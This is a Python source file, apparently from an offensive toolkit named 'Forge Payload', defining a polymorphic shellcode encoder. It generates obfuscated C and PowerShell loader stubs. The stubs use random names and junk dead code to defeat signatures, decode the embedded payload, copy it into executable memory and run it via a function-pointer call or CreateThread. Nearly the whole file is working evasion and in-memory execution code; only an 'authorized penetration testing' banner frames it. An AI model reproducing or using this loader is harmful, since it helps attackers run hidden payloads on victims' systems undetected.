"""Polymorphic Encoder — generates a unique decoder stub each time.

Each call produces a structurally different (but semantically equivalent)
decoder.  Techniques used:
  - Random variable/function names
  - Random register allocation hints (C volatile)
  - Junk instruction insertion (dead code)
  - Random loop unrolling factor
  - Key mixing (XOR + ROL + ADD combination)
  - Stub reordering (decrypt then copy vs copy then decrypt)

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import os
import random
import secrets
import string
import textwrap


class PolyEncoder:
    """Polymorphic encoder — different stub layout every call."""

    _JUNK_OPS = [
        "volatile int {v} = {n}; (void){v};",
        "volatile char {v} = 0x{h:02x}; (void){v};",
        "volatile long {v} = {n}L; (void){v};",
    ]

    def __init__(self, seed: int | None = None):
        self._rng = random.Random(seed)

    # ── Public API ─────────────────────────────────────────────────────

    def encode(self, data: bytes, iterations: int = 1) -> tuple[bytes, str]:
        """Encode data with a unique polymorphic scheme each call.

        Returns:
            (encoded_bytes, description)
        """
        key   = [secrets.randbelow(256) for _ in range(4)]
        out   = self._multi_encode(data, key, iterations)
        desc  = (f"poly/{iterations}x  key={bytes(key).hex()}"
                 f"  size={len(data)}→{len(out)}")
        return out, desc

    def decoder_c_stub(self, encoded: bytes, key: list[int], arch: str = "x64") -> str:
        """Generate a unique polymorphic C stub each call."""
        return self._gen_c_stub(encoded, key, arch)

    def decoder_ps1_stub(self, encoded: bytes, key: list[int]) -> str:
        """Generate a unique polymorphic PowerShell stub each call."""
        return self._gen_ps1_stub(encoded, key)

    # ── Encoding ───────────────────────────────────────────────────────

    def _multi_encode(self, data: bytes, key: list[int], iterations: int) -> bytes:
        """Apply the poly scheme N times, rotating key each round."""
        buf = data
        for i in range(iterations):
            round_key = [(k + i * 7) & 0xFF for k in key]
            buf = self._encode_round(buf, round_key)
        return buf

    def _encode_round(self, data: bytes, key: list[int]) -> bytes:
        """XOR + ROL + ADD multi-byte key mixing."""
        result = bytearray(len(data))
        for i, b in enumerate(data):
            k = key[i % 4]
            # Byte transformation: XOR → ROL(3) → ADD key[i%4 + 1]
            v = b ^ k
            v = ((v << 3) | (v >> 5)) & 0xFF      # ROL 3
            v = (v + key[(i + 1) % 4]) & 0xFF
            result[i] = v
        return bytes(result)

    def _decode_round(self, data: bytes, key: list[int]) -> bytes:
        """Inverse of _encode_round."""
        result = bytearray(len(data))
        for i, v in enumerate(data):
            k0 = key[i % 4]
            k1 = key[(i + 1) % 4]
            v = (v - k1) & 0xFF                   # -ADD
            v = ((v >> 3) | (v << 5)) & 0xFF      # ROR 3
            v = v ^ k0                             # ^XOR
            result[i] = v
        return bytes(result)

    # ── C Stub Generation ──────────────────────────────────────────────

    def _rand_name(self, prefix: str = "", length: int = 6) -> str:
        chars = string.ascii_lowercase
        return prefix + "".join(self._rng.choice(chars) for _ in range(length))

    def _junk(self, n: int = 2) -> list[str]:
        """Generate n lines of dead-code junk."""
        lines = []
        for _ in range(n):
            tmpl = self._rng.choice(self._JUNK_OPS)
            lines.append(tmpl.format(
                v=self._rand_name("_j"),
                n=self._rng.randint(1, 0x7FFF),
                h=self._rng.randint(0, 255),
            ))
        return lines

    def _gen_c_stub(self, encoded: bytes, key: list[int], arch: str) -> str:
        sz    = len(encoded)
        sc_hex = ", ".join(f"0x{b:02x}" for b in encoded)
        k     = key

        # Random names
        fn    = self._rand_name("dec_")
        sc_n  = self._rand_name("buf_")
        key_n = self._rand_name("key_")
        idx   = self._rand_name("i_")
        tmp   = self._rand_name("v_")
        ex    = self._rand_name("ex_")

        # Junk lines
        junk1 = "\n    ".join(self._junk(2))
        junk2 = "\n    ".join(self._junk(2))

        # Decode operations (inverse of _encode_round)
        # v = (v - k1) & 0xFF ; v = ROR(v,3) ; v ^= k0
        k0 = f"{key_n}[{idx} % 4]"
        k1 = f"{key_n}[({idx} + 1) % 4]"
        decode_ops = textwrap.dedent(f"""\
            unsigned char {tmp} = {sc_n}[{idx}];
            {tmp} = ({tmp} - {k1}) & 0xFF;
            {tmp} = (({tmp} >> 3) | ({tmp} << 5)) & 0xFF;
            {tmp} ^= {k0};
            {sc_n}[{idx}] = {tmp};""")

        return textwrap.dedent(f"""\
        /*
         * Forge Payload — Polymorphic Decoder Stub
         * Key: {bytes(key).hex()}  Size: {sz} bytes
         * FOR AUTHORIZED PENETRATION TESTING ONLY.
         */
        #ifdef _WIN32
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #else
        #include <sys/mman.h>
        #include <string.h>
        #include <stdlib.h>
        #endif
        #include <stddef.h>

        static unsigned char {sc_n}[] = {{ {sc_hex} }};
        static const unsigned char {key_n}[] = {{ 0x{k[0]:02x}, 0x{k[1]:02x}, 0x{k[2]:02x}, 0x{k[3]:02x} }};

        static void {fn}(void) {{
            {junk1}
            for (size_t {idx} = 0; {idx} < {sz}; {idx}++) {{
                {decode_ops}
            }}
            {junk2}
        }}

        int main(void) {{
            {fn}();
        #ifdef _WIN32
            void *{ex} = VirtualAlloc(NULL, {sz}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
            if (!{ex}) return 1;
            memcpy({ex}, {sc_n}, {sz});
            DWORD _old;
            VirtualProtect({ex}, {sz}, PAGE_EXECUTE_READ, &_old);
        #else
            void *{ex} = mmap(NULL, {sz}, PROT_READ|PROT_WRITE|PROT_EXEC,
                               MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
            if ({ex} == (void *)-1) return 1;
            memcpy({ex}, {sc_n}, {sz});
        #endif
            ((void(*)(){ex})());
            return 0;
        }}
        """)

    def _gen_ps1_stub(self, encoded: bytes, key: list[int]) -> str:
        import base64
        b64 = base64.b64encode(encoded).decode()
        k   = key

        # Random PS variable names
        vsc  = "$" + self._rand_name("sc")
        vkey = "$" + self._rand_name("ky")
        vi   = "$" + self._rand_name("xi")
        vt   = "$" + self._rand_name("t")
        vmem = "$" + self._rand_name("m")

        # Junk comments
        c1 = f"# {self._rand_name('init_')}{self._rng.randint(100,999)}"
        c2 = f"# {self._rand_name('proc_')}{self._rng.randint(100,999)}"

        return textwrap.dedent(f"""\
        # Forge Payload — Polymorphic PowerShell Decoder
        # FOR AUTHORIZED PENETRATION TESTING ONLY.
        {c1}
        {vsc}  = [Convert]::FromBase64String('{b64}')
        {vkey} = @( 0x{k[0]:02x}, 0x{k[1]:02x}, 0x{k[2]:02x}, 0x{k[3]:02x} )
        {c2}
        for ({vi} = 0; {vi} -lt {vsc}.Length; {vi}++) {{
            {vt} = {vsc}[{vi}]
            {vt} = ({vt} - {vkey}[({vi}+1) % 4] + 256) -band 0xFF
            {vt} = (({vt} -shr 3) -bor ({vt} -shl 5)) -band 0xFF
            {vt} = {vt} -bxor {vkey}[{vi} % 4]
            {vsc}[{vi}] = [byte]{vt}
        }}
        {vmem} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal({vsc}.Length)
        [System.Runtime.InteropServices.Marshal]::Copy({vsc}, 0, {vmem}, {vsc}.Length)
        $k32_ = Add-Type -MemberDefinition @'
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr a, UIntPtr b, uint c, out uint d);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr a, UIntPtr b, IntPtr c, IntPtr d, uint e, IntPtr f);
            [DllImport("kernel32")]
            public static extern uint WaitForSingleObject(IntPtr h, uint ms);
        '@ -Name 'PK{self._rng.randint(1000,9999)}' -Namespace 'Forge' -PassThru
        [uint32]$_o = 0
        $k32_::VirtualProtect({vmem}, [uint]{vsc}.Length, 0x20, [ref]$_o) | Out-Null
        $_t = $k32_::CreateThread(0, 0, {vmem}, 0, 0, 0)
        $k32_::WaitForSingleObject($_t, 0xFFFFFFFF) | Out-Null
        """)
